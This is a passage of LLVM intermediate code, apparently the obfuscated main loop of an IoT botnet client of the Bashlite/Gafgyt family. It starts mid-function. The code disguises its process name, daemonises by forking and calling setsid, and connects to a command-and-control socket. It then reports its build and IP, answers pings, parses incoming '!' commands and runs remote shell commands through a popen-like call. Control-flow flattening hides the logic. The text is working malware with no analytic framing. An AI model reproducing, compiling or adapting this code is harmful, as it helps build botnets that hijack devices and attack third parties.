  %41 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %40, i32 0, i32 0, i32 0)
  %42 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %43 = call i32 @getpid() #5
  %44 = xor i32 %42, %43
  call void @srand(i32 %44) #5
  %45 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %46 = call i32 @getpid() #5
  %47 = xor i32 %45, %46
  call void @init_rand(i32 %47)
  %48 = call i32 @getOurIP()
  %49 = call i32 @fork() #5
  store i32 %49, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %7, align 4
  %switchVar = alloca i32
  store i32 -1713051495, i32* %switchVar
  %.reg2mem3 = alloca i1
  %.reg2mem5 = alloca i1
  %.reg2mem7 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1713051495, label %first
    i32 -665109745, label %52
    i32 -777964479, label %55
    i32 1249008926, label %59
    i32 -141556368, label %63
    i32 -1219498641, label %64
    i32 1370874212, label %68
    i32 -438931642, label %69
    i32 -1091593509, label %70
    i32 1856269053, label %71
    i32 2097067198, label %72
    i32 -387493641, label %73
    i32 -1677006201, label %74
    i32 1263275896, label %78
    i32 2133083922, label %82
    i32 -371165670, label %84
    i32 1341960239, label %90
    i32 180154696, label %96
    i32 465881225, label %97
    i32 -92202425, label %103
    i32 260602411, label %112
    i32 1955180798, label %115
    i32 882129299, label %121
    i32 -1786252093, label %132
    i32 1620108568, label %135
    i32 -1286834153, label %148
    i32 275231403, label %154
    i32 1570458629, label %164
    i32 929423451, label %167
    i32 1346198206, label %171
    i32 2145989878, label %172
    i32 483905887, label %175
    i32 1555166549, label %185
    i32 1660291338, label %188
    i32 1284246686, label %194
    i32 -68851373, label %195
    i32 934676494, label %202
    i32 778915663, label %205
    i32 2028366469, label %211
    i32 -1848750385, label %216
    i32 -1953530083, label %218
    i32 528677914, label %221
    i32 953615749, label %227
    i32 -1646939398, label %228
    i32 -1546891412, label %237
    i32 924913833, label %247
    i32 2044182359, label %256
    i32 163619401, label %258
    i32 -2101344497, label %264
    i32 412011152, label %266
    i32 -2040459797, label %272
    i32 -1641537915, label %277
    i32 -2130835798, label %279
    i32 433195737, label %282
    i32 -273601904, label %287
    i32 929436023, label %292
    i32 873028417, label %301
    i32 354972574, label %306
    i32 906450006, label %310
    i32 -1807289468, label %311
    i32 -1353746203, label %318
    i32 -1427393745, label %324
    i32 933761617, label %328
    i32 653891995, label %331
    i32 -747168840, label %336
    i32 1251454134, label %340
    i32 1949462450, label %346
    i32 1254025927, label %369
    i32 -472829548, label %371
    i32 323727420, label %377
    i32 -846692981, label %378
    i32 1668591289, label %383
    i32 6142405, label %388
    i32 1406737882, label %391
    i32 -1724248234, label %392
    i32 -2137649959, label %393
    i32 -1332014796, label %394
    i32 1401104966, label %396
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %50 = icmp ne i32 %.reload, 0
  %51 = select i1 %50, i32 -665109745, i32 -777964479
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %7, align 4
  %54 = call i32 @waitpid(i32 %53, i32* %9, i32 0)
  call void @exit(i32 0) #14
  unreachable

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i32, i32* %7, align 4
  %57 = icmp ne i32 %56, 0
  %58 = select i1 %57, i32 2097067198, i32 1249008926
  store i32 %58, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = call i32 @fork() #5
  store i32 %60, i32* %8, align 4
  %61 = icmp ne i32 %60, 0
  %62 = select i1 %61, i32 -141556368, i32 -1219498641
  store i32 %62, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  call void @exit(i32 0) #14
  unreachable

; <label>:64:                                     ; preds = %loopEntry
  %65 = load i32, i32* %8, align 4
  %66 = icmp ne i32 %65, 0
  %67 = select i1 %66, i32 -438931642, i32 1370874212
  store i32 %67, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  store i32 -1091593509, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  store i32 -1091593509, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  store i32 1856269053, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  store i32 -387493641, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  store i32 -387493641, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  store i32 -1677006201, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = call i32 @setsid() #5
  %76 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.492, i32 0, i32 0)) #5
  %77 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #5
  store i32 1263275896, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = call i32 @initConnection()
  %80 = icmp ne i32 %79, 0
  %81 = select i1 %80, i32 2133083922, i32 -371165670
  store i32 %81, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = call i32 @sleep(i32 5)
  store i32 1263275896, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* @mainCommSock, align 4
  %86 = call i8* @getBuild()
  %87 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %88 = call i8* @inet_ntoa(i32 %87) #5
  %89 = call i32 (i32, i8*, ...) @sockprintf(i32 %85, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.493, i32 0, i32 0), i8* %86, i8* %88)
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  store i32 1341960239, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = load i32, i32* @mainCommSock, align 4
  %92 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %93 = call i32 @recvLine(i32 %91, i8* %92, i32 4096)
  store i32 %93, i32* %11, align 4
  %94 = icmp ne i32 %93, -1
  %95 = select i1 %94, i32 180154696, i32 -1332014796
  store i32 %95, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  store i32 0, i32* %12, align 4
  store i32 465881225, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  %98 = load i32, i32* %12, align 4
  %99 = sext i32 %98 to i64
  %100 = load i64, i64* @numpids, align 8
  %101 = icmp ult i64 %99, %100
  %102 = select i1 %101, i32 -92202425, i32 483905887
  store i32 %102, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i32*, i32** @pids, align 8
  %105 = load i32, i32* %12, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i32, i32* %104, i64 %106
  %108 = load i32, i32* %107, align 4
  %109 = call i32 @waitpid(i32 %108, i32* null, i32 1)
  %110 = icmp sgt i32 %109, 0
  %111 = select i1 %110, i32 260602411, i32 1346198206
  store i32 %111, i32* %switchVar
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  %113 = load i32, i32* %12, align 4
  %114 = add nsw i32 %113, 1
  store i32 %114, i32* %14, align 4
  store i32 1955180798, i32* %switchVar
  br label %loopEnd

; <label>:115:                                    ; preds = %loopEntry
  %116 = load i32, i32* %14, align 4
  %117 = zext i32 %116 to i64
  %118 = load i64, i64* @numpids, align 8
  %119 = icmp ult i64 %117, %118
  %120 = select i1 %119, i32 882129299, i32 1620108568
  store i32 %120, i32* %switchVar
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %122 = load i32*, i32** @pids, align 8
  %123 = load i32, i32* %14, align 4
  %124 = zext i32 %123 to i64
  %125 = getelementptr inbounds i32, i32* %122, i64 %124
  %126 = load i32, i32* %125, align 4
  %127 = load i32*, i32** @pids, align 8
  %128 = load i32, i32* %14, align 4
  %129 = sub i32 %128, 1
  %130 = zext i32 %129 to i64
  %131 = getelementptr inbounds i32, i32* %127, i64 %130
  store i32 %126, i32* %131, align 4
  store i32 -1786252093, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  %133 = load i32, i32* %14, align 4
  %134 = add i32 %133, 1
  store i32 %134, i32* %14, align 4
  store i32 1955180798, i32* %switchVar
  br label %loopEnd

; <label>:135:                                    ; preds = %loopEntry
  %136 = load i32*, i32** @pids, align 8
  %137 = load i32, i32* %14, align 4
  %138 = sub i32 %137, 1
  %139 = zext i32 %138 to i64
  %140 = getelementptr inbounds i32, i32* %136, i64 %139
  store i32 0, i32* %140, align 4
  %141 = load i64, i64* @numpids, align 8
  %142 = add i64 %141, -1
  store i64 %142, i64* @numpids, align 8
  %143 = load i64, i64* @numpids, align 8
  %144 = add i64 %143, 1
  %145 = mul i64 %144, 4
  %146 = call noalias i8* @malloc(i64 %145) #5
  %147 = bitcast i8* %146 to i32*
  store i32* %147, i32** %13, align 8
  store i32 0, i32* %14, align 4
  store i32 -1286834153, i32* %switchVar
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  %149 = load i32, i32* %14, align 4
  %150 = zext i32 %149 to i64
  %151 = load i64, i64* @numpids, align 8
  %152 = icmp ult i64 %150, %151
  %153 = select i1 %152, i32 275231403, i32 929423451
  store i32 %153, i32* %switchVar
  br label %loopEnd

; <label>:154:                                    ; preds = %loopEntry
  %155 = load i32*, i32** @pids, align 8
  %156 = load i32, i32* %14, align 4
  %157 = zext i32 %156 to i64
  %158 = getelementptr inbounds i32, i32* %155, i64 %157
  %159 = load i32, i32* %158, align 4
  %160 = load i32*, i32** %13, align 8
  %161 = load i32, i32* %14, align 4
  %162 = zext i32 %161 to i64
  %163 = getelementptr inbounds i32, i32* %160, i64 %162
  store i32 %159, i32* %163, align 4
  store i32 1570458629, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i32, i32* %14, align 4
  %166 = add i32 %165, 1
  store i32 %166, i32* %14, align 4
  store i32 -1286834153, i32* %switchVar
  br label %loopEnd

; <label>:167:                                    ; preds = %loopEntry
  %168 = load i32*, i32** @pids, align 8
  %169 = bitcast i32* %168 to i8*
  call void @free(i8* %169) #5
  %170 = load i32*, i32** %13, align 8
  store i32* %170, i32** @pids, align 8
  store i32 1346198206, i32* %switchVar
  br label %loopEnd

; <label>:171:                                    ; preds = %loopEntry
  store i32 2145989878, i32* %switchVar
  br label %loopEnd

; <label>:172:                                    ; preds = %loopEntry
  %173 = load i32, i32* %12, align 4
  %174 = add nsw i32 %173, 1
  store i32 %174, i32* %12, align 4
  store i32 465881225, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  %176 = load i32, i32* %11, align 4
  %177 = sext i32 %176 to i64
  %178 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %177
  store i8 0, i8* %178, align 1
  %179 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim(i8* %179)
  %180 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %181 = call i8* @strstr(i8* %180, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.40, i32 0, i32 0)) #10
  %182 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %183 = icmp eq i8* %181, %182
  %184 = select i1 %183, i32 1555166549, i32 1660291338
  store i32 %184, i32* %switchVar
  br label %loopEnd

; <label>:185:                                    ; preds = %loopEntry
  %186 = load i32, i32* @mainCommSock, align 4
  %187 = call i32 (i32, i8*, ...) @sockprintf(i32 %186, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.494, i32 0, i32 0))
  store i32 1341960239, i32* %switchVar
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  %189 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %190 = call i8* @strstr(i8* %189, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.495, i32 0, i32 0)) #10
  %191 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %192 = icmp eq i8* %190, %191
  %193 = select i1 %192, i32 1284246686, i32 -68851373
  store i32 %193, i32* %switchVar
  br label %loopEnd

; <label>:194:                                    ; preds = %loopEntry
  call void @exit(i32 0) #14
  unreachable

; <label>:195:                                    ; preds = %loopEntry
  %196 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %196, i8** %15, align 8
  %197 = load i8*, i8** %15, align 8
  %198 = load i8, i8* %197, align 1
  %199 = zext i8 %198 to i32
  %200 = icmp eq i32 %199, 33
  %201 = select i1 %200, i32 934676494, i32 -2137649959
  store i32 %201, i32* %switchVar
  br label %loopEnd

; <label>:202:                                    ; preds = %loopEntry
  %203 = load i8*, i8** %15, align 8
  %204 = getelementptr inbounds i8, i8* %203, i64 1
  store i8* %204, i8** %16, align 8
  store i32 778915663, i32* %switchVar
  br label %loopEnd

; <label>:205:                                    ; preds = %loopEntry
  %206 = load i8*, i8** %16, align 8
  %207 = load i8, i8* %206, align 1
  %208 = zext i8 %207 to i32
  %209 = icmp ne i32 %208, 32
  %210 = select i1 %209, i32 2028366469, i32 -1848750385
  store i32 %210, i32* %switchVar
  store i1 false, i1* %.reg2mem3
  br label %loopEnd

; <label>:211:                                    ; preds = %loopEntry
  %212 = load i8*, i8** %16, align 8
  %213 = load i8, i8* %212, align 1
  %214 = zext i8 %213 to i32
  %215 = icmp ne i32 %214, 0
  store i32 -1848750385, i32* %switchVar
  store i1 %215, i1* %.reg2mem3
  br label %loopEnd

; <label>:216:                                    ; preds = %loopEntry
  %.reload4 = load i1, i1* %.reg2mem3
  %217 = select i1 %.reload4, i32 -1953530083, i32 528677914
  store i32 %217, i32* %switchVar
  br label %loopEnd

; <label>:218:                                    ; preds = %loopEntry
  %219 = load i8*, i8** %16, align 8
  %220 = getelementptr inbounds i8, i8* %219, i32 1
  store i8* %220, i8** %16, align 8
  store i32 778915663, i32* %switchVar
  br label %loopEnd

; <label>:221:                                    ; preds = %loopEntry
  %222 = load i8*, i8** %16, align 8
  %223 = load i8, i8* %222, align 1
  %224 = zext i8 %223 to i32
  %225 = icmp eq i32 %224, 0
  %226 = select i1 %225, i32 953615749, i32 -1646939398
  store i32 %226, i32* %switchVar
  br label %loopEnd

; <label>:227:                                    ; preds = %loopEntry
  store i32 1341960239, i32* %switchVar
  br label %loopEnd

; <label>:228:                                    ; preds = %loopEntry
  %229 = load i8*, i8** %16, align 8
  store i8 0, i8* %229, align 1
  %230 = load i8*, i8** %15, align 8
  %231 = getelementptr inbounds i8, i8* %230, i64 1
  store i8* %231, i8** %16, align 8
  %232 = load i8*, i8** %15, align 8
  %233 = load i8*, i8** %16, align 8
  %234 = call i64 @strlen(i8* %233) #10
  %235 = getelementptr inbounds i8, i8* %232, i64 %234
  %236 = getelementptr inbounds i8, i8* %235, i64 2
  store i8* %236, i8** %15, align 8
  store i32 -1546891412, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  %238 = load i8*, i8** %15, align 8
  %239 = load i8*, i8** %15, align 8
  %240 = call i64 @strlen(i8* %239) #10
  %241 = sub i64 %240, 1
  %242 = getelementptr inbounds i8, i8* %238, i64 %241
  %243 = load i8, i8* %242, align 1
  %244 = zext i8 %243 to i32
  %245 = icmp eq i32 %244, 10
  %246 = select i1 %245, i32 2044182359, i32 924913833
  store i32 %246, i32* %switchVar
  store i1 true, i1* %.reg2mem5
  br label %loopEnd

; <label>:247:                                    ; preds = %loopEntry
  %248 = load i8*, i8** %15, align 8
  %249 = load i8*, i8** %15, align 8
  %250 = call i64 @strlen(i8* %249) #10
  %251 = sub i64 %250, 1
  %252 = getelementptr inbounds i8, i8* %248, i64 %251
  %253 = load i8, i8* %252, align 1
  %254 = zext i8 %253 to i32
  %255 = icmp eq i32 %254, 13
  store i32 2044182359, i32* %switchVar
  store i1 %255, i1* %.reg2mem5
  br label %loopEnd

; <label>:256:                                    ; preds = %loopEntry
  %.reload6 = load i1, i1* %.reg2mem5
  %257 = select i1 %.reload6, i32 163619401, i32 -2101344497
  store i32 %257, i32* %switchVar
  br label %loopEnd

; <label>:258:                                    ; preds = %loopEntry
  %259 = load i8*, i8** %15, align 8
  %260 = load i8*, i8** %15, align 8
  %261 = call i64 @strlen(i8* %260) #10
  %262 = sub i64 %261, 1
  %263 = getelementptr inbounds i8, i8* %259, i64 %262
  store i8 0, i8* %263, align 1
  store i32 -1546891412, i32* %switchVar
  br label %loopEnd

; <label>:264:                                    ; preds = %loopEntry
  %265 = load i8*, i8** %15, align 8
  store i8* %265, i8** %17, align 8
  store i32 412011152, i32* %switchVar
  br label %loopEnd

; <label>:266:                                    ; preds = %loopEntry
  %267 = load i8*, i8** %15, align 8
  %268 = load i8, i8* %267, align 1
  %269 = zext i8 %268 to i32
  %270 = icmp ne i32 %269, 32
  %271 = select i1 %270, i32 -2040459797, i32 -1641537915
  store i32 %271, i32* %switchVar
  store i1 false, i1* %.reg2mem7
  br label %loopEnd

; <label>:272:                                    ; preds = %loopEntry
  %273 = load i8*, i8** %15, align 8
  %274 = load i8, i8* %273, align 1
  %275 = zext i8 %274 to i32
  %276 = icmp ne i32 %275, 0
  store i32 -1641537915, i32* %switchVar
  store i1 %276, i1* %.reg2mem7
  br label %loopEnd

; <label>:277:                                    ; preds = %loopEntry
  %.reload8 = load i1, i1* %.reg2mem7
  %278 = select i1 %.reload8, i32 -2130835798, i32 433195737
  store i32 %278, i32* %switchVar
  br label %loopEnd

; <label>:279:                                    ; preds = %loopEntry
  %280 = load i8*, i8** %15, align 8
  %281 = getelementptr inbounds i8, i8* %280, i32 1
  store i8* %281, i8** %15, align 8
  store i32 412011152, i32* %switchVar
  br label %loopEnd

; <label>:282:                                    ; preds = %loopEntry
  %283 = load i8*, i8** %15, align 8
  store i8 0, i8* %283, align 1
  %284 = load i8*, i8** %15, align 8
  %285 = getelementptr inbounds i8, i8* %284, i32 1
  store i8* %285, i8** %15, align 8
  %286 = load i8*, i8** %17, align 8
  store i8* %286, i8** %18, align 8
  store i32 -273601904, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  %288 = load i8*, i8** %18, align 8
  %289 = load i8, i8* %288, align 1
  %290 = icmp ne i8 %289, 0
  %291 = select i1 %290, i32 929436023, i32 873028417
  store i32 %291, i32* %switchVar
  br label %loopEnd

; <label>:292:                                    ; preds = %loopEntry
  %293 = load i8*, i8** %18, align 8
  %294 = load i8, i8* %293, align 1
  %295 = zext i8 %294 to i32
  %296 = call i32 @toupper(i32 %295) #10
  %297 = trunc i32 %296 to i8
  %298 = load i8*, i8** %18, align 8
  store i8 %297, i8* %298, align 1
  %299 = load i8*, i8** %18, align 8
  %300 = getelementptr inbounds i8, i8* %299, i32 1
  store i8* %300, i8** %18, align 8
  store i32 -273601904, i32* %switchVar
  br label %loopEnd

; <label>:301:                                    ; preds = %loopEntry
  %302 = load i8*, i8** %17, align 8
  %303 = call i32 @strcmp(i8* %302, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.496, i32 0, i32 0)) #10
  %304 = icmp eq i32 %303, 0
  %305 = select i1 %304, i32 354972574, i32 653891995
  store i32 %305, i32* %switchVar
  br label %loopEnd

; <label>:306:                                    ; preds = %loopEntry
  %307 = call i32 @listFork()
  %308 = icmp ne i32 %307, 0
  %309 = select i1 %308, i32 906450006, i32 -1807289468
  store i32 %309, i32* %switchVar
  br label %loopEnd

; <label>:310:                                    ; preds = %loopEntry
  store i32 1341960239, i32* %switchVar
  br label %loopEnd

; <label>:311:                                    ; preds = %loopEntry
  %312 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %312, i8 0, i64 1024, i32 16, i1 false)
  %313 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %314 = load i8*, i8** %15, align 8
  %315 = call i32 (i8*, i8*, ...) @szprintf(i8* %313, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.497, i32 0, i32 0), i8* %314)
  %316 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %317 = call i32 @fdpopen(i8* %316, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.33, i32 0, i32 0))
  store i32 %317, i32* %20, align 4
  store i32 -1353746203, i32* %switchVar
  br label %loopEnd

; <label>:318:                                    ; preds = %loopEntry
  %319 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %320 = load i32, i32* %20, align 4
  %321 = call i8* @fdgets(i8* %319, i32 1024, i32 %320)
  %322 = icmp ne i8* %321, null
  %323 = select i1 %322, i32 -1427393745, i32 933761617
  store i32 %323, i32* %switchVar
  br label %loopEnd

; <label>:324:                                    ; preds = %loopEntry
  %325 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @trim(i8* %325)
  %326 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %326, i8 0, i64 1024, i32 16, i1 false)
  %327 = call i32 @sleep(i32 1)
  store i32 -1353746203, i32* %switchVar
  br label %loopEnd

; <label>:328:                                    ; preds = %loopEntry
  %329 = load i32, i32* %20, align 4
  %330 = call i32 @fdpclose(i32 %329)
  call void @exit(i32 0) #14
  unreachable

; <label>:331:                                    ; preds = %loopEntry
  store i32 1, i32* %22, align 4
  %332 = load i8*, i8** %15, align 8
  %333 = call i8* @strtok(i8* %332, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.498, i32 0, i32 0)) #5
  store i8* %333, i8** %23, align 8
  %334 = load i8*, i8** %17, align 8
  %335 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 0
  store i8* %334, i8** %335, align 16
  store i32 -747168840, i32* %switchVar
  br label %loopEnd

; <label>:336:                                    ; preds = %loopEntry
  %337 = load i8*, i8** %23, align 8
  %338 = icmp ne i8* %337, null
  %339 = select i1 %338, i32 1251454134, i32 -472829548
  store i32 %339, i32* %switchVar
  br label %loopEnd

; <label>:340:                                    ; preds = %loopEntry
  %341 = load i8*, i8** %23, align 8
  %342 = load i8, i8* %341, align 1
  %343 = zext i8 %342 to i32
  %344 = icmp ne i32 %343, 10
  %345 = select i1 %344, i32 1949462450, i32 1254025927
  store i32 %345, i32* %switchVar
  br label %loopEnd

; <label>:346:                                    ; preds = %loopEntry
  %347 = load i8*, i8** %23, align 8
  %348 = call i64 @strlen(i8* %347) #10
  %349 = add i64 %348, 1
  %350 = call noalias i8* @malloc(i64 %349) #5
  %351 = load i32, i32* %22, align 4
  %352 = sext i32 %351 to i64
  %353 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %352
  store i8* %350, i8** %353, align 8
  %354 = load i32, i32* %22, align 4
  %355 = sext i32 %354 to i64
  %356 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %355
  %357 = load i8*, i8** %356, align 8
  %358 = load i8*, i8** %23, align 8
  %359 = call i64 @strlen(i8* %358) #10
  %360 = add i64 %359, 1
  call void @llvm.memset.p0i8.i64(i8* %357, i8 0, i64 %360, i32 1, i1 false)
  %361 = load i32, i32* %22, align 4
  %362 = sext i32 %361 to i64
  %363 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %362
  %364 = load i8*, i8** %363, align 8
  %365 = load i8*, i8** %23, align 8
  %366 = call i8* @strcpy(i8* %364, i8* %365) #5
  %367 = load i32, i32* %22, align 4
  %368 = add nsw i32 %367, 1
  store i32 %368, i32* %22, align 4
  store i32 1254025927, i32* %switchVar
  br label %loopEnd

; <label>:369:                                    ; preds = %loopEntry
  %370 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.498, i32 0, i32 0)) #5
  store i8* %370, i8** %23, align 8
  store i32 -747168840, i32* %switchVar
  br label %loopEnd

; <label>:371:                                    ; preds = %loopEntry
  %372 = load i32, i32* %22, align 4
  %373 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i32 0, i32 0
  call void @processCmd(i32 %372, i8** %373)
  %374 = load i32, i32* %22, align 4
  %375 = icmp sgt i32 %374, 1
  %376 = select i1 %375, i32 323727420, i32 -1724248234
  store i32 %376, i32* %switchVar
  br label %loopEnd

; <label>:377:                                    ; preds = %loopEntry
  store i32 1, i32* %24, align 4
  store i32 1, i32* %24, align 4
  store i32 -846692981, i32* %switchVar
  br label %loopEnd

; <label>:378:                                    ; preds = %loopEntry
  %379 = load i32, i32* %24, align 4
  %380 = load i32, i32* %22, align 4
  %381 = icmp slt i32 %379, %380
  %382 = select i1 %381, i32 1668591289, i32 1406737882
  store i32 %382, i32* %switchVar
  br label %loopEnd

; <label>:383:                                    ; preds = %loopEntry
  %384 = load i32, i32* %24, align 4
  %385 = sext i32 %384 to i64
  %386 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %385
  %387 = load i8*, i8** %386, align 8
  call void @free(i8* %387) #5
  store i32 6142405, i32* %switchVar
  br label %loopEnd

; <label>:388:                                    ; preds = %loopEntry
  %389 = load i32, i32* %24, align 4
  %390 = add nsw i32 %389, 1
  store i32 %390, i32* %24, align 4
  store i32 -846692981, i32* %switchVar
  br label %loopEnd

; <label>:391:                                    ; preds = %loopEntry
  store i32 -1724248234, i32* %switchVar
  br label %loopEnd

; <label>:392:                                    ; preds = %loopEntry
  store i32 -2137649959, i32* %switchVar
  br label %loopEnd

; <label>:393:                                    ; preds = %loopEntry
  store i32 1341960239, i32* %switchVar
  br label %loopEnd

; <label>:394:                                    ; preds = %loopEntry
  %395 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.499, i32 0, i32 0))
  store i32 1263275896, i32* %switchVar
  br label %loopEnd

; <label>:396:                                    ; preds = %loopEntry
  %397 = load i32, i32* %3, align 4
  ret i32 %397

loopEnd:                                          ; preds = %394, %393, %392, %391, %388, %383, %378, %377, %371, %369, %346, %340, %336, %331, %324, %318, %311, %310, %306, %301, %292, %287, %282, %279, %277, %272, %266, %264, %258, %256, %247, %237, %228, %227, %221, %218, %216, %211, %205, %202, %195, %188, %185, %175, %172, %171, %167, %164, %154, %148, %135, %132, %121, %115, %112, %103, %97, %96, %90, %84, %82, %78, %74, %73, %72, %71, %70, %69, %68, %64, %59, %55, %first, %switchDefault
  br label %loopEntry
}

declare i32 @printf(i8*, ...) #4

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #2

declare i32 @prctl(...) #4

; Function Attrs: nounwind
declare i32 @setsid() #2

; Function Attrs: nounwind
declare i32 @chdir(i8*) #2

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #2

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind }
attributes #4 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind }
